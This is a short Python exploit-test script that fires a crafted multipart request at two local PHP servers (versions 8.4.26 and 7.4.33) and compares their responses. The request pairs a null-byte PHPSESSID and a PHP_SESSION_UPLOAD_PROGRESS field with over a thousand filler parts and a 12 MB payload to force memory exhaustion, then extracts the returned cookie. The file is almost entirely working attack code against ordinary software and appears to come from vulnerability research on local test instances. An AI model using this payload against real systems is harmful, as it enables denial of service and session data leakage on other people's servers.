"""Fire the EXACT exploit OOM request on both 8.4.26 and 7.4.33, compare responses."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

def fire_oom(port, label):
    t = E.Target(f"http://127.0.0.1:{port}/", timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
        oom = b"Allowed memory size" in resp or b"Fatal error" in resp
        raw = E.parse_cookie(resp)
        print(f"\n### {label} (port {port}) ###", flush=True)
        print(f"  oom={oom} cookie={len(raw)}B", flush=True)
        print(f"  body[:160]={resp[:160]!r}", flush=True)
    except Exception as e:
        print(f"{label}: EXC {e}", flush=True)
    time.sleep(0.5)

fire_oom(18113, "8.4.26")
fire_oom(18108, "7.4.33")
